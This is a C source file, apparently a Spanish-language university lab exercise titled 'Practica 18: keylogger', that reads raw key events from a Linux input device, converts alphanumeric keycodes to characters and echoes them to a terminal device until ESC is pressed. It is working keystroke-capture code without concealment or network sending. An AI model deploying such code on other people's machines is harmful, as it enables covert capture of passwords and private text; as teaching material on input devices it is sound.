/*
 * Practica 18: keylogger
 * Jose Luis Torres Rodriguez
 *
 * Crea un programa que lea el dispositivo de entrada correspondiente a tu teclado, tendras generados
 * valores numericos que corresponden a cada una de las entradas, pero yo quiero leer caracteres, no numeros,
 * ya tienes el mapa de caracteres, hazlo!
 * Imprime en pantalla lo que leas de este dispositivo.
 * 
 * OBS: Se abren dos dispositivos, uno corresponde al teclado y el otro al dispositivo de salida
 *      Vease los define's TECLADO y SALIDA
*/

#include<stdio.h>
#include<stdlib.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<unistd.h>
#include<sys/types.h>
#include<linux/input.h>

/* Dispositivo correspondiente al teclado, en el equipo donde se desarrollo 
 * el programa es "/dev/input/event3\0" */
#define TECLADO "/dev/input/event3\0"

/* Dispositivo para enviar la salida, en este caso la terminal /dev/pts/3 */
#define SALIDA "/dev/pts/3\0"

char convierte(__u16 code);


/*
 * Convierte los codigos leidos del teclado a caracteres
 * En este programa solamente se consideran las teclas alfanumericas.
 */
char convierte(__u16 code)
{
  switch(code)
    {
    /* Los codigos se tomaron del archivo /usr/include/linux/input.h */
    case KEY_A: return('a');
    case KEY_B:	return('b');
    case KEY_C:	return('c');
    case KEY_D:	return('d');
    case KEY_E:	return('e');
    case KEY_F:	return('f');
    case KEY_G:	return('g');
    case KEY_H:	return('h');
    case KEY_I:	return('i');
    case KEY_J:	return('j');
    case KEY_K:	return('k');
    case KEY_L:	return('l');
    case KEY_M:	return('m');
    case KEY_N:	return('n');
    case KEY_O:	return('o');
    case KEY_P:	return('p');
    case KEY_Q:	return('q');
    case KEY_R:	return('r');
    case KEY_S:	return('s');
    case KEY_T:	return('t');
    case KEY_U:	return('u');
    case KEY_V:	return('v');
    case KEY_W:	return('w');
    case KEY_X:	return('x');
    case KEY_Y:	return('y');
    case KEY_Z:	return('z');
    case KEY_0:	return('0');
    case KEY_1:	return('1');
    case KEY_2:	return('2');
    case KEY_3:	return('3');
    case KEY_4:	return('4');
    case KEY_5:	return('5');
    case KEY_6:	return('6');
    case KEY_7:	return('7');
    case KEY_8:	return('8');
    case KEY_9:	return('9');
    case KEY_ESC: return(0); // La tecla ESC nos permite cerrar la aplicacion
    }
  return(' '); // El resto de las teclas se muestran como espacios en blanco
}

int main()
{
  int fd, // Descriptor para el teclado
    fo; // Dispositivo de salida

  /* Dispositivo correspondiente al teclado, en el equipo donde se desarrollo 
     el programa es "/dev/input/event3\0" */
  char *archivo="/dev/input/event3\0"; 

  /* Dispositivo para enviar la salida, en este caso la terminal /dev/pts/3 */
  char *archivoOut="/dev/pts/3\0"; 

  struct input_event ev; // Se usa para leer los eventos
  char c; // Para convertir el codigo de la tecla en caracter

  /* Intentamos abrir el dispositivo del teclado */
  if((fd=open(archivo,O_RDONLY))==-1)
    {
      fprintf(stderr,"No se pudo abrir la entrada");
      return(1);
    }

  /* Intentamos abrir el dispositivo para mostrar la salida */
  if((fo=open(archivoOut,O_WRONLY|O_APPEND))==-1)
    {
      fprintf(stderr,"No se pudo abrir la salida");
      return(1);
    }

  /* Intentamos leer del archivo */ 
  while (1!=0)
    {
      read(fd,&ev,sizeof(struct input_event)); // Leemos del teclado
      
      /* En la estructura input_event el campo ev.code almacena el codigo de la tecla oprimida */
      if (ev.type == EV_KEY && ev.value == 1) // Verificamos si se oprimio una tecla
	{
	  c = convierte(ev.code); // Convertimos a caracter
	  if (c == 0)  // Si se presiono la tecla ESC finalizamos el ciclo
	    break;
	  write(fo,&c,1);  // Escribimos en el dispositivo de salida
	}
    }
  
  /* Cerramos el archivo */
  if(close(fd)==-1)
    fprintf(stderr,"No se pudo cerrar el descriptor de archivo");
  if(close(fo)==-1)
    fprintf(stderr,"No se pudo cerrar el descriptor de archivo");
  return(0);
}
